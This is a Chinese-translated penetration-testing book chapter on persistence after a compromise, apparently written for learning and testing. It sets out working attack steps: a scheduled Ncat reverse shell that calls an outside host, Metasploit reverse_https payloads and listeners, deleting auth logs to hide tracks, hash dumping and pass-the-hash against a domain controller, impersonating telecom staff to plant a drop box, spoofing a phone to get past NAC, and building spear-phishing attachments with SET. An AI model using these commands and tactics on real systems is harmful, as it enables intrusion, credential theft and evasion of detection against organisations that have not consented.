# 第九章：在服务器或桌面上保持访问权限

曾经想过黑客是如何能够进入一个安全网络并在网络中呆上几个月甚至几年而不被发现的吗？好吧，以下是一些留在网络内部的大招。我们不仅将讨论如何维持已经拥有的本地机器的访问权限，还将讨论如何在网络内部使用**Drop Box**，并让它回家。

在本章中，我们将涵盖以下主题：

+   保持访问或 ET 回家

+   使用 Ncat 保持访问

+   Drop Box

+   破解**网络访问控制器**（**NAC**）

+   使用社会工程学工具包创建钓鱼攻击

+   使用后门工厂来规避杀毒软件

# 保持访问或 ET 回家

在黑客世界中，持久连接被称为**回家**。持久性使攻击者能够留下一个连接返回到攻击机器，并对受害机器进行完整的命令行或桌面连接。

为什么要这样做？你的网络通常受到防火墙的保护，对内部机器的端口连接由防火墙控制，而不是由本地机器控制。当然，如果你在一个盒子里，你可以打开 telnet，并且你可以从本地网络访问 telnet 端口。但是你很难从公共网络访问到这个端口。任何本地防火墙都可能阻止这个端口，而网络扫描会显示受害机器上正在运行 telnet。这将警示目标组织的网络安全团队。因此，与其在受损服务器上开放一个端口，不如让你的受害机器呼叫你的攻击机器更安全、更有效。

在本章中，我们将主要使用 HTTPS 反向 shell。之所以这样做是因为你的受损机器可以呼叫攻击机器上的任何端口，但是如果发送到一个不寻常的目的地，比如攻击机器上的端口`4444`，一个良好的 IDS/IPS 系统可能会检测到这种连接。大多数 IDS/IPS 系统将对 HTTPS 端口的出站连接进行白名单处理，因为大多数系统的系统更新都是通过 HTTPS 协议进行的。你的出站连接到攻击机器看起来更像是一个更新而不是一个被黑客攻击的端口。

持久连接确实必须直接返回到攻击者的机器。你可以将这种类型的连接从一个或多个机器上转移，以掩盖你的踪迹。从目标网络内部的一台机器和目标网络外部的一对机器上进行转移，使得防御者更难以看清发生了什么。

是的，你可以将这种类型的攻击从朝鲜或中国的一台机器上转移出来，看起来就像攻击来自那里。每当我们在媒体上听到一个网络攻击来自某个可恶的外国攻击者时，我们都会翻白眼。除非你能够访问攻击机器及其日志，否则无法确定攻击的原始来源。即使有了对攻击机器的访问，你仍然不知道攻击者经过了多少次转移才到达那台机器。你仍然不知道最后一个连接的完整回溯。在这个过程中使用类似 Tor 的东西，没有人能确定这次黑客攻击到底来自哪里。

在这个演示中，我们将进行一次四向枢纽的攻击，横跨世界，穿越四个不同的国家，向您展示这是如何完成的。是的，我们正在真正做这件事！

*绝对不要*攻击我们在本书中将要使用的公共 IP 地址。这些是我们为这个项目租用的服务器。在本书出版时，它们将不再在我们的控制之下。

持久连接的一个问题是它们可能会被发现。一个人永远不能低估偏执的系统管理员的细心眼睛（*为什么服务器 192.168.202.4 已经与中国 IP 地址建立了四天的 HTTP 连接？*）。一个真正的攻击者将使用这种方法来掩盖他的踪迹，以防被抓住并且攻击服务器被检查是否有入侵者的证据。在你退出每台机器后清除日志后，追溯连接几乎是不可能的。持久连接所连接的第一个盒子将被攻击者视为敌对的，他们将在每次连接后删除与这台机器的连接痕迹。

请注意以下图表中受害机器具有内部地址。由于受害机器正在呼叫，我们正在绕过 NAT 和入站防火墙规则的入站保护。受害机器将呼叫新加坡的服务器。攻击者正在与美国的受损机器进行交互，但在登录新加坡的恶意服务器之前，会通过两个跳转进行转向。我们在这里仅使用了四个跳转进行演示，但您可以使用任意数量的跳转。跳数越多，反向跟踪就越混乱。一个优秀的攻击者还将在下一次进入时改变他的路线和入站连接的 IP 地址：

![](img/715bacf3-aff5-4522-84a3-fd250a55924e.png)

对于我们的第一个跳转，我们将前往阿姆斯特丹`178.62.241.119`！如果我们运行`whois`，我们可以看到这个：

```
whois 178.62.241.119

inetnum:    178.62.128.0 - 178.62.255.255
netname:    DIGITALOCEAN-AMS-5
descr:     DigitalOcean Amsterdam
country:    NL
admin-c:    BU332-RIPE
tech-c:    BU332-RIPE
status:    ASSIGNED PA
mnt-by:    digitalocean
mnt-lower:   digitalocean
mnt-routes:  digitalocean
created:    2014-05-01T16:43:59Z
last-modified: 2014-05-01T16:43:59Z
source:    RIPE # Filtered  
```

黑客提示：

一个优秀的调查员看到这些信息后，可能会传唤 DigitalOcean 以找出在受害者回家时租用该 IP 的人，但同样可能是属于列宁格勒的一位老太太的机器。一个僵尸网络的基础是由一组受损的盒子开发而成。本章描述了一个小型的自制僵尸网络。

我们现在将转向德国的主机，`46.101.191.216`。再次，如果我们运行`whois`命令，我们可以看到这个：

```
whois 46.101.191.216

inetnum:    46.101.128.0 - 46.101.255.255
netname:    EU-DIGITALOCEAN-DE1
descr:     Digital Ocean, Inc.
country:    DE
org:      ORG-DOI2-RIPE
admin-c:    BU332-RIPE
tech-c:    BU332-RIPE
status:    ASSIGNED PA
mnt-by:    digitalocean
mnt-lower:   digitalocean
mnt-routes:  digitalocean
mnt-domains:  digitalocean
created:    2015-06-03T01:15:35Z
last-modified: 2015-06-03T01:15:35Z
source:    RIPE # Filtered  
```

现在转向新加坡的转向主机`128.199.190.69`，并运行`whois`命令：

```
whois 128.199.190.69

inetnum:    128.199.0.0 - 128.199.255.255
netname:    DOPI1
descr:     DigitalOcean Cloud
country:    SG
admin-c:    BU332-RIPE
tech-c:    BU332-RIPE
status:    LEGACY
mnt-by:    digitalocean
mnt-domains:  digitalocean
mnt-routes:  digitalocean
created:    2004-07-20T10:29:14Z
last-modified: 2015-05-05T01:52:51Z
source:    RIPE # Filtered
org:      ORG-DOI2-RIPE  
```

我们现在已经准备好从新加坡发动攻击。我们离目标机器只有几英里，但对于毫无戒心的 IT 系统安全管理员来说，攻击看起来就像是来自半个地球之外。

# 掩盖我们的踪迹

如果我们对这些机器有 root 或 sudo 访问权限，我们可以通过运行以下命令干净地退出。这将删除我们登录的痕迹。由于这是我们的攻击机器，我们将以 root 身份运行。包含 SSH 服务登录信息的文件是`/var/log/auth.log`。如果我们删除它然后创建一个新文件，我们登录的日志现在已经消失：

1.  进入`/var/log`目录：

```
cd /var/log  
```

1.  删除`auth.log`文件：

```
rm auth.log  
```

1.  创建一个新的空文件：

```
touch auth.log  
```

1.  关闭终端会话：

```
exit  
```

现在从服务器退出，你就可以干净地离开了。如果你在退出连接时在每台机器上都这样做，那么你就不会被发现。由于这都是基于文本的，当通过这么多的转向运行命令时，你不会真正注意到任何延迟。此外，所有这些流量都是通过 SSH 加密的，因此没有人可以看到你在做什么或者你要去哪里。

# 使用 Ncat 保持访问

**NetCat**（**Ncat**）是一个鲜为人知但功能强大的工具，旨在与网络端口建立原始套接字连接。它是一个小型工具，设计为从一个可执行文件运行，可以轻松传输到系统，并且还可以重命名为任何名称，以隐藏操作系统中的可执行文件。Ncat 将仅使用用户级访问权限回拨到攻击服务器。Ncat 是一个开源应用程序，由[`www.insecure.org`](https://www.insecure.org)提供，这些人也是维护 Nmap 的同样出色的人。Ncat 及其较老的表亲**nc**都已安装在 Kali 上。Ncat 与 Nmap 的任何安装捆绑在一起。

实际上，如前所述，Ncat 有两个版本。旧版本的可执行文件是`nc`。`nc`也会对任何 TCP/UDP 端口进行原始套接字连接：

![](img/2fa89d8d-7a0b-4e55-ac77-1d8eee17a960.png)

Ncat 的一个重要优势是它支持 SSL 加密，而 nc 的所有流量都是明文的。nc 的流量有时会被 IDS/IPS 和其他安全设备捕获。Ncat 的流量可以被加密和隐藏，并且看起来像一个 HTTPS 流。Ncat 还有能力只允许来自某些 IP 地址或 IP 子网的连接。

破坏机器的初始攻击可以是网络攻击，也可以是使用某种社会工程方法，比如携带负载以连接回我们攻击服务器的鱼叉式网络钓鱼邮件。

以下截图显示了一份你会想要拒绝的报价 PDF。这个 PDF 包含相同的*phone home*负载，并旨在在用户没有任何交互或批准的情况下安装恶意软件负载。这个 PDF 是使用一个巧妙的工具创建的，我们将在下一节中看到，*使用社会工程工具包创建一个鱼叉式网络钓鱼攻击*：

![](img/04540190-f411-4a24-89d2-df46b690f59d.png)

一旦初始攻击被破坏，我们希望系统定期回拨。这样的攻击可以设置为保持恒定的连接，每次连接丢失时都会重置连接。它也可以设置为在指定的时间间隔重新连接。我们喜欢设置这些，这样攻击会在某个特定时间回拨，如果攻击机器上没有要连接的端口，那么攻击会保持沉默，直到再次到达那个时间。一个完全持久的连接可能会引起网络安全的注意。

我们现在连接到受害者机器，并向受害者上传 Ncat 的副本。从会话中可以看出，这是一次内部攻击。`ncat.exe`文件位于 Kali 的`/usr/share/ncat-w32/`目录中。连接后，在 Meterpreter 中运行以下命令：

```
upload /usr/share/ncat-w32/ncat.exe C:/windows/ncat.exe  
```

![](img/4004b209-0f77-40bb-80cb-e3ce44e863da.png)

这将把 Ncat 可执行文件传输到受害者系统。请注意，我们在使用`/`而不是`\`作为目录斜杠。由于您使用的是 Linux，必须使用正斜杠**/**。如果您使用**\**并运行命令，您会发现目录名称会连在一起，文件将无法正确上传。

转到 Windows 7 受害者，我们可以在`Windows`目录中看到该文件：

![](img/778d4198-086b-4d65-94ac-42d33336a070.png)

# 设置 NetCat 客户端

自 Windows NT 3.14 以来，Windows 一直有一个命令行工具来运行计划任务。这个工具叫做`AT`命令。这个命令与 Linux 或 UNIX 上可用的`cron`命令非常相似。您可以设置时间、日期和运行任何命令行工具或脚本的次数。因此，使用您的 Meterpreter 连接`shell`到系统：

```
shell  
```

您现在在受害者系统中。输入以下命令：

```
AT 5:00PM ncat.exe -nv 128.199.190.69 443 -ssl -e cmd.exe  
```

![](img/8b165c75-b0db-46fc-8286-c7a655ad0d07.png)

这设置了一个每天下午 5:00 运行的作业。它将使用以下变量运行`ncat.exe`可执行文件。它正在调用攻击服务器`128.199.190.69`的端口`443`。`-ssl`标志告诉连接使用 SSL。`-e cmd.exe`标志告诉可执行文件通过连接运行`cmd.exe`可执行文件。

在下午 5:00 之前，我们使用各种枢纽登录到我们的恶意服务器，并启动`ncat`进入监听模式，等待下午 5:00 到来。

请注意，我们在这里连接到`//rogue3`并运行以下命令：

```
ncat -nvlp 443 -ssl  
```

`-n`标志告诉系统不使用 DNS。`-v`告诉系统使输出详细，这样您可以看到输入和输出。`-l`告诉 Ncat 监听。`-p`告诉 Ncat 在端口`443`上监听，`-ssl`告诉 Ncat 使用 SSL 加密会话：

![](img/e1b49e7f-fac4-48f5-9702-2df3bcf23a15.png)

我们现在已经连接到我们黑客入侵的 Windows 7 机器，具有完整的管理员访问权限，这个漏洞利用将在每天下午 5:00 准备好使用，而无需对网络进行进一步攻击。

警告！

一个真正的攻击者会将 Ncat 的名称更改为更模糊和难以在您的文件系统中发现的名称。小心您的系统上存在两个`calc.exe`或`notepad.exe`。一个在奇怪的地方很可能是 Ncat 或我们接下来要构建的另一种类型的漏洞利用。

# 使用 Metasploit 打电话回家

好吧，那是老派的方法。现在，让我们使用 Metasploit 的工具来做同样的事情。我们将在`//rogue3`上加载 Metasploit，我们邪恶的服务器，让我们的受害者机器连接到该机器上的 Meterpreter shell。我们将从之前的内部黑客中构建和上传这个漏洞利用。除了`msfconsole`之外，我们还将使用 Metasploit 工具包中的其他工具。Metasploit 配备了一个独立的应用程序来构建自定义漏洞和 shellcode。这个工具叫做`msfvenom`，我们将使用它来构建一个漏洞利用。完全使用`msfvenom`可能是一个完整的章节，超出了本书的范围，所以在这里我们将使用最常见的标志来生成我们的可执行文件来构建一个反向 HTTP 漏洞利用。我们将通过运行以下命令来构建漏洞利用：

```
msfvenom -a x86 -platform windows -p windows/meterpreter/reverse_https -f exe -o svchost13.exe  
```

MSFvenom 是一个强大且可配置的工具。MSFvenom 具有构建自定义漏洞的能力，可以绕过任何防病毒软件。防病毒软件通过查看文件的签名来工作。MSFvenom 具有编码漏洞的能力，使得防病毒软件无法检测到它。这是隐藏漏洞的情况，就像另一个常见的可执行文件，比如记事本 MSFvenom，可以向可执行文件添加 NOP 或空代码，使其大小与原始文件相同。很可怕，不是吗？

以下表格显示了标志的列表：

| 用法： |
| --- |
| `/opt/metasploit/apps/pro/msf3/msfvenom [options] <var=val>` |
| **选项** | **长选项** | **变量** | **注释** |
| `-p` | `--payload` | `<payload>` | 要使用的负载。指定`-`或`stdin`以使用自定义负载 |
| `-l` | `--list` | `[module_type]` | 列出模块类型示例：负载、编码器、NOP、全部 |
| `-n` | `--nopsled` | `<length>` | 在负载上添加一个大小为[length]的 nopsled |
| `-f` | `--format` | `<format>` | 输出格式（使用`--help-formats`列出） |
| `-e` | `--encoder` |  | 要使用的编码器 |
| `-a` | `--arch` | `<architecture>` | 要使用的架构 |
|  | `--platform` | `<platform>` | 负载的平台 |
| `-s` | `--space` | `<length>` | 结果负载的最大大小 |
| `-b` | `--bad-chars` | `<list>` | 要避免的字符列表；示例：`\x00\xff` |
| `-i` | `--iterations` | `<count>` | 编码负载的次数 |
| `-c` | `--add-code` | `<path>` | 指定要包含的额外 win32 shellcode 文件 |
| `-x` | `--template` | `<path>` | 指定要用作模板的自定义可执行文件 |
| `-k` | `--keep` |  | 保留模板行为，并将负载注入为新线程 |
| `-o` | `--options` |  | 列出负载的标准选项 |
| `-h` | `--help` |  | 显示此消息 |
|  | `--help-formats` |  | 列出可用格式 |

以下截图显示了命令的输出。`msfvenom`显示没有使用编码器，并且在构建中没有检查坏字符。对于这个演示，它们是不需要的：

![](img/3e1676cc-08b2-4d69-8f8d-0ca3f078f49a.png)

现在，通过运行`ls`命令，我们可以看到我们的文件：

![](img/d691b71a-d30d-485e-ab9c-9f5c3c102ced.png)

现在我们有东西要上传。就像 Ncat 示例一样，我们将使用我们对系统的内部妥协来上传我们的漏洞利用：

![](img/88154cef-8391-4a74-b654-6e58255622c3.png)

与 Ncat 一样，我们将进入受害者机器并设置`AT`命令运行`svchost13.exe`：

```
shell
AT 5:25PM c:\windows\svchost.exe
exit  
```

在下午 5:25 之前，登录到恶意服务器`//rogue3`。启动 Metasploit 服务`msfconsole`，设置监听器并接受连接。然后使用以下命令设置常见处理程序模块：

```
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_https
set LHOST 128.199.190.69
set LPORT 443
exploit  
```

运行 exploit 后，处理程序将开始监听端口`443`，等待你无助的受害者打电话回家。等待一会儿后，我们看到一个来自`69.131.155.226`的连接。这是我们受害者机器背后防火墙的地址。然后处理程序给我们系统的命令提示符。运行 Meterpreter 命令`sysinfo`，我们可以看到名称和机器信息。从这里，你拥有完全的控制权！

一个真正的攻击者可能设置这个漏洞并且几个月后才回来。唯一的问题迹象将是每天下午 5:25 只有一个连接出去并失败。这只是网络上的一个小问题。

![](img/2b717544-7a22-40d9-ac8d-fdb754939ad5.png)

你可能会兴奋地继续下一个征服，但由于我们在网络防火墙后面的机器上，让我们看看网络的其他部分。通过运行`ipconfig`，我们看到这台机器上有两个网络接口。一个在 10 网络上，地址为`10.100.0.0/24`，另一个在 192.168 网络上，地址为`192.168.202.0`。这两个都是受保护的网络，但重要的是网络不是平面的。你不能在私有范围内的两个不同网络类之间路由数据包。10 网络可以访问互联网，所以它可能是一个 DMZ，上面的机器可能更加强化并且包含的数据价值更少。这可能意味着另一个网络上有一些宝藏。这种枢纽可以连接到任一网络，但让我们在这里攻击后端网络并寻找真正的黄金：

![](img/b67fd131-5de9-47de-a5b6-42efc01d3b90.png)

红色标记的路径是我们将要从持久连接到后端网络攻击域控制器的枢纽路径。

那个时间已经过去，我们在我们的恶意服务器上启动了监听器，受害者机器已经打来电话。我们准备进一步。我们将使用 Meterpreter 命令`autoroute`来进入`192.168.202.0/24`网络。

这一次，当我们设置处理程序时，我们将在运行`exploit`命令时使用`-j`标志将会话发送到后台：

![](img/dbec0765-7d32-470c-842f-e60639c1319b.png)

然后受害者机器打来电话。这告诉我们目标网络中的防火墙没有调整以阻止出站数据流，并且异常行为没有引起他们的**入侵检测系统**（**IDS**）的警报。我们建立了连接：

![](img/038c6f49-36e2-4411-8df5-9456164eac08.png)

我们在受害者机器内部，所以我们可以运行 DOS 命令。如果我们运行`ipconfig`，我们可以看到两个接口及其地址：

![](img/efb5ee64-fc9b-4a58-93e4-1c2ec6604db6.png)

我们知道，系统管理员经常在他们的网络上重复使用密码，所以让我们从这台机器获取哈希并尝试在 DC 上使用它。将这些哈希保存到文本文件或您的**KeepNote**中。稍后会用到它们。

```
getsystem
hashdump  
```

注意`hashdump`命令还找到并下载了`BO Weaver`的密码提示。提示是`funny`。这可能会让你猜密码更容易。有些人的密码提示几乎就是他们的密码，比如*Raiders Star Qback 1970*。一点点研究就能告诉你四分卫是乔治·布兰达，他当时 43 岁，那是雷德队在 NFL 的第一个赛季。他的球衣号码是 16。你的密码列表需要包括*GeorgeBlanda16*，*Blanda1970*和其他相关的东西：

![](img/9b53d897-6728-46bf-8cd5-d0ef0bd8a3e2.png)

输入以下内容：

```
run autoroute -s 192.168.202.0/24  
```

然后运行以下命令打印路由表：

```
run autoroute -p  
```

我们看到我们有一条通往后端网络的路由：

![](img/faee21d5-13de-4f22-b275-1137be0bdf16.png)

# 在 Metasploit 内部运行端口扫描器

现在你有了一条路线，是时候进行侦察了。为了减少噪音，我们将在 Metasploit 中使用一个简单的端口扫描程序：

1.  通过输入以下命令退出 Meterpreter：

```
background  
```

这使得会话保持运行并处于后台状态。

1.  设置扫描仪如下：

```
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.202.0/24
set PORTS 139,445,389  
```

我们已将端口`389`设置为查找域控制器。

1.  按以下方式设置活动线程数：

```
set THREADS 20    
```

1.  按以下方式运行扫描仪：

```
run    
```

扫描程序运行，我们看到了一个 Windows 域控制器。这是我们的新目标：

![](img/77fa5d16-fc3c-481e-98ec-8cce27a5ad62.png)

现在我们有了目标和密码哈希，下一步是上传一个漏洞利用。由于我们有登录凭据，我们将使用`psexec`模块连接到域控制器：

![](img/6ae67851-4bd6-48f0-bb90-cea423f45265.png)

我们没有使用明文密码，因为我们从 Win7 机器的管理员帐户中捕获了哈希。由于我们有哈希，我们不必暴力破解密码。不同类别的机器的密码可能不同，但在这种情况下，它们是一样的。

传递哈希

在 Metasploit 中，哈希与密码一样有效。这被称为**传递哈希**。传递哈希漏洞至少已经存在了十年，它们使用网络上可用的 Windows 登录会话信息。该漏洞利用**本地安全机构**（**LSA**）信息来获取网络上登录到计算机的用户的 NTLM 哈希列表。用于获取信息的工具，如 Metasploit 框架或传递哈希工具包，获取用户名、域名和 LM 和 NT 哈希。

一旦利用运行，我们就会得到一个 Meterpreter shell，并通过运行`sysinfo`，我们可以看到我们在域控制器中：

```
sysinfo  
```

![](img/32c79140-c39a-4e26-880f-9bdb40322e4f.png)

如前所述，Windows Active Directory 将密码哈希存储在 SAM 数据库中，因此我们可以使用`hashdump`命令来转储域中的所有哈希值：

```
hashdump  
```

![](img/9688cb6c-ea24-4620-ad42-3d41bc0c63da.png)

我们现在从没有互联网访问权限的后端网络中妥协了王国的所有关键。如果你注意到`hashdump`中用户名后面的数字，你会发现管理员是用户`500`。许多专家告诉 Windows 网络管理员更改管理员帐户的名称，这样就没有人能够知道哪些用户具有哪些权限。显然，这是行不通的。即使使用用户名`NegligibleNebbish`，只要具有`500`的 UID，就表明这是一个具有管理权限的用户。

如果我们将此会话放在后台并运行会话命令，我们可以看到从`//rogue3`恶意服务器到我们受损系统的两个会话正在运行：

```
background
sessions -l  
```

![](img/17112a06-c06a-4d3f-91ce-58b35ad7c583.png)

# 投递盒

投递盒，有时也被称为**跳板盒**，是一个小设备，你可以将其隐藏在你正在瞄准的物理位置内。将设备放入位置有时需要其他技能，比如社会工程，甚至是一点点的闯入，以便将设备放入位置。投递盒也可以是安全顾问公司发送的一个箱子，用于在远程位置对网络进行内部渗透测试。

![](img/becbafe6-9120-49b3-ac03-c4137c157153.png)

菠萝

如今，小型全功能计算机价格便宜且易于配置。市场上还有一些专门设计用于此目的并且可以立即使用的设备。树莓派是一款运行完整 Linux 发行版的小型单板计算机，可以为此工作进行配置。专为此目的设计的两款设备是 Wi-Fi Pineapple 和 Pwnie Express。Wi-Fi Pineapple 是我们的个人最爱。它配备了两个可分别配置的 Wi-Fi 接入点。它的大小只比一包香烟稍大。拥有两个 Wi-Fi 无线电使得这个设备能够连接并从任何网络进行跳板连接。还可以连接 USB CAT5 适配器以连接有线网络。这些设备是全功能的 Linux 系统，可以安装任何 Linux 应用程序。

树莓派是另一个可以用于这个目的的好设备。树莓派是一款小型的单板 ARM 系统，可以运行许多版本的 Linux 操作系统。是的，我们的好朋友 Offensive Security 为树莓派构建了一款 Kali 的版本。将镜像简单复制到微型 SD 卡上，系统就准备好了。他们还在这个镜像中使用了另一个巧妙的技巧，用于秘密行动。树莓派设置可以完全加密，并设置为完全从远程系统启动。通过使用特殊密码删除私人加密密钥，也可以远程使系统变砖或禁用。如何设置这个设备的完整细节可以在本章末尾的链接中找到。

现在，你必须将这个设备偷偷放入网络中。对于有线网络，一个长期受欢迎的入侵方法是友好的电信公司员工的方式。员工的工作证很容易在互联网上找到。制作工作证也是一个简单的过程。在被动足迹阶段，你可以找出谁为你的目标提供电信服务。一旦你有了工作证，你就可以出现在目标地点，携带你的工具包和笔记本电脑，去前台说：“嗨，我是来自电信公司的。”我们收到了一张关于互联网速度变慢的工单。”你会惊讶地发现这种方法多么容易就能进入大门，并直接被带到电话间。一旦进入电话间，你可以隐藏并连接你预先配置的 Drop Box。当它启动时，它会自动连接到家里，你就进入了！记住，安全的最薄弱环节始终是人的接口。

对于一种不那么侵入性的方法，如果你的目标办公室有 Wi-Fi，你可以将其用作攻击向量。这就是两个 Wi-Fi 无线电的用武之地。一个可以用来攻击和连接到目标网络，另一个可以用作你的跳板连接。Pineapple 设计为由 USB 电池包供电，就像你用来给手机充电的那种。根据电池大小，Pineapple 可以在断电之前运行长达 72 小时甚至更长时间。通过这种安排，你的恶意软件甚至可以轻松地隐藏在灌木丛中，无需交流电源即可运行。如果在你的攻击期间无法在现场，也无法与恶意服务器联系，捕获的数据也可以复制到设备上的闪存卡上。

在对位置进行物理侦察时，寻找建筑物外部的电缆。有时在某个地点进行扩建时，负责布线的人员会在建筑物外部布线，以便更容易进行安装，但这也为攻击留下了一个漏洞。通过一个良好的藏身之处，几个 RJ45 连接器和一个廉价的交换机，你就可以接入有线网络。

# 破解网络访问控制器（NAC）

如今，NAC 设备在网络上变得越来越普遍。NAC 确实提供了更高级别的安全性，但它们并不是它们的供应商营销和销售材料所暗示的“终极解决方案”。我们将向您展示一种简单的绕过公司网络上 NAC 控制的方法。

以下信息来自我们一段时间前对一家真实公司进行的真实黑客攻击。当然，所有的名称和 IP 地址都已更改以保护公司。这不是理论。这是真实世界的黑客攻击。对于这个戏剧化的公司来说，好消息是我们是好人。令人沮丧的是，我们只用了大约 30 分钟来弄清楚这一点，也许花了 2 个小时来完全实施。

我们将绕过公司的 NAC，https://www.widgetmakers.com。Widget Makers 公司有两个网络：一个是企业局域网（CorpNET），另一个是包含机密数据的生产网络（ProdNET）。这两个网络都是扁平设计，两个网络都可以互相完全访问。在 CorpNET 上配置并安装了一个 NAC 设备。员工现在必须在他们的机器上使用 NAC 代理才能连接到 CorpNET。Widget Makers 使用 SIP 电话进行语音通信。这些电话不在一个单独的 VLAN 上。它们连接到 CorpNET VLAN 以方便使用。Widget Makers 还在 CorpNET 上有许多网络打印机。

NAC 设备使用安装在用户机器上的代理进行用户登录和验证用户和机器的身份。这些设备可以配置为使用**远程身份验证拨号用户系统**（**RADIUS**）服务器或域控制器进行用户凭据的验证。有时，NAC 设备使用证书对机器进行身份验证。试图伪造内部机器的 MAC 地址而没有代理和登录通常会导致 MAC 地址被锁定在网络之外。

系统的弱点在于代理。大多数 NAC 系统都是专有的，与一个供应商绑定。一个供应商的代理将无法与另一个供应商的代理一起使用，而且没有 NAC 控制的标准。大多数供应商只制作运行在 Windows 上的代理，所以如果你的网络上有 Mac 或 Linux 工作站，这些设备无法使用 NAC 控制加入网络。现在供应商会告诉你只能运行 Windows 网络。如果你是一名系统管理员，你知道在现实中根本就没有这样的事情。即使所有工作站和服务器都在任何网络上运行 Windows，还有其他设备要么不运行 Windows，要么无法运行 Windows。

那么，对于不运行 Windows 操作系统的电话、打印机和工作站，你该如何让它们在 NAC 控制范围内工作？你必须在 NAC 设置中将它们的 MAC 和 IP 地址列入白名单。因此，通过将这些设备之一从网络中移除并伪装其身份，你现在可以访问受限 VLAN，并具有你伪装设备的访问级别。在扁平网络中，通常你可以访问所有本地网络中的所有内容。

这种黑客攻击最容易的目标之一是 SIP 电话。如果打印机离线，人们肯定会注意到。每个人都使用打印机。要利用打印机进行这种利用，你必须选择一个不经常使用的打印机。电话是另一回事。办公室总是有额外的电话供客人使用，而且通常情况下，如果你知道员工的工作时间表，你可以选择一个度假的人的电话。拔掉他们的电话，把你的 Drop Box 贴在桌子下面，然后连接到电话插座，你就进入了：

![](img/375f89d6-1116-4bed-b615-df5524e59717.png)

那么你该如何保护自己呢？

首先，不要指望 NAC 成为网络上的终极安全功能。NAC 应该只是网络安全架构中的一个层面。实际上，它应该是网络安全的一个较高层面。一个简单的解决方法是关闭（拔掉）未使用的网络端口。这不会阻止黑客篡改度假的人的桌面电话，但可以防止一个空的工作区成为黑客的总部。

任何网络安全的第一层应该是适当的分割。如果不能路由到它，就无法到达它。请注意在前图中**CorpNET**和**ProdNET**可以完全访问彼此。通过**CorpNET**进入的攻击者，伪造网络设备，可以访问受限的**ProdNET**。

# 使用社会工程工具包创建鱼叉式网络钓鱼攻击

**社会工程工具包**（**SET**）许可协议规定，SET 纯粹是为了善良而设计的。未经网络和设备所有者授权的恶意目的使用此工具违反了此工具集的**服务条款**（**TOS**）和许可证。要找到此工具，通过菜单 Kali Linux 08-渗透测试工具 | 社会工程工具包，或在命令行中键入`setoolkit`：

![](img/a4c42417-c224-4786-bd86-26828aab53a9.png)

这次攻击将使用 Metasploit 反向 HTTP 有效载荷，因此在使用 SET 之前，您必须执行一些步骤：

1.  启动 Metasploit 服务。通过菜单启动 Metasploit 控制台：应用程序 | 08-渗透测试工具 | Metasploit 框架。您还可以通过在命令提示符中键入`msfconsole`来启动 Metasploit 框架控制台，完全避免使用 GUI 菜单。

1.  确定本地主机地址，您的侦听器将在该地址上侦听，以便您的恶意软件有东西可以回家。在我们的测试网络中，Kali 服务器正在运行在物理主机上的虚拟机上。当恶意软件呼叫时，主机的 IP 或虚拟机的桥接伪以太网卡必须是目的地。如果您在互联网上从 VMS 机器上运行 Kali，这将稍微困难一些。

1.  以下是测试网络的配置。有两台具有互联网访问权限的机器，以及两台只能从内部网络访问的服务器。Kali 186 是攻击者的笔记本电脑，而 Windows 10 工作站是内部网络的跳板。

1.  一旦您启动了 Metasploit，您需要启动侦听器，这样您即将创建的恶意软件在回家时有东西可以回答。

1.  在 MSF 命令提示符中输入以下命令：

```
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_https
set LHOST 10.0.0.2
set LPORT 4343 exploit  
```

1.  侦听器是一个正在运行的开放进程，因此光标不会返回到就绪状态。为了显示侦听器是活动的，我们可以使用`nmap`对其进行端口扫描：

![](img/21521e32-60f1-4665-83d5-deccdcb5c9ac.png)

另一方面，侦听器已经对`nmap`扫描做出了响应，并输出了扫描数据：

![](img/f0ff3f00-86bb-4235-a0d8-f2aaf3f0a7da.png)

在下图中，我们可以看到扫描源由侦听器标记，并且所有扫描请求都记录为来自`10.0.2.15`，这是 Kali 机器的内部 IP：

![](img/277a7f2e-2df2-41fa-a9ff-c3bfe4bf48cd.png)

我们将要创建的恶意软件将是一个包含在 PDF 文件中的可执行文件。这将作为附件发送到目标公司中一个被确认的系统管理员的电子邮件，该邮件来自一个据称是安全来源的电子邮件。我们将从社会工程工具包的菜单结构开始进行审查。

主菜单有六个条目和一个退出提示：

1.  1）社会工程攻击

1.  2）快速跟踪渗透测试

1.  3）第三方模块

1.  4）更新社会工程师工具包

1.  5）更新 SET 配置

1.  6）帮助、积分和关于

1.  99）退出社会工程工具包

在条目＃1 下，`社会工程攻击`，有 11 个条目：

1.  1）鱼叉式网络钓鱼攻击向量

1.  2）网站攻击向量

1.  3）传染性媒体生成器

1.  4）创建有效载荷和侦听器

1.  5）大规模邮件发送攻击

1.  6）基于 Arduino 的攻击向量

1.  7）无线接入点攻击向量

1.  8）QR 码生成器攻击向量

1.  9）Powershell 攻击向量

1.  10）第三方模块

1.  99）返回主菜单。

# 使用鱼叉式网络钓鱼攻击向量菜单

`鱼叉式网络钓鱼攻击向量`菜单有四个选项：

1.  1) 执行大规模电子邮件攻击

1.  2) 创建一个文件格式有效负载

1.  3) 创建社会工程模板

1.  99) 返回主菜单

由于我们将建立一个持久的威胁，让我们能够控制受害者的机器，并且必须克服用户可能不愿意双击附件的可能性，我们必须创建一个不可抗拒的鱼叉式网络钓鱼邮件。为了做到这一点，提前进行有效的侦察是很重要的。

公司通讯录和日历对于制造打开邮件所需的紧迫感是有用的。就像通过电子邮件进行营销一样，无论是合法的还是垃圾邮件，鱼叉式网络钓鱼邮件的标题必须对受害者有趣、引人入胜或令人恐惧。

![](img/501e35a9-7355-4c94-8bd9-cd6a2a64c88a.png)

这封电子邮件简短、有趣，并且可以通过贪婪来制造紧迫感。附件可以是以下任何一种：

+   一个 ZIP 文件，假定里面有一个文档

+   一个 Word 文档

+   一个 PDF 文件

SET 提供了 21 种可能的有效负载。其中一些在 Mac 操作系统上的效果会比在 Windows 系统上更好。大多数 Windows 工作站没有配置处理 RAR 压缩文件。以下是可用的选择：

1.  1) SET 自定义编写的 DLL 劫持攻击向量（RAR，ZIP）

1.  2) SET 自定义编写的文档 UNC LM SMB 捕获攻击

1.  3) MS14-017 Microsoft Word RTF 对象混淆（2014-04-01）

1.  4) Microsoft Windows CreateSizedDIBSECTION 堆栈缓冲区溢出

1.  5) Microsoft Word RTF pFragments Stack Buffer Overflow (MS10-087)

1.  6) Adobe Flash Player“Button”远程代码执行

1.  7) Adobe CoolType SING 表“uniqueName”溢出

1.  8) Adobe Flash Player“newfunction”无效指针使用

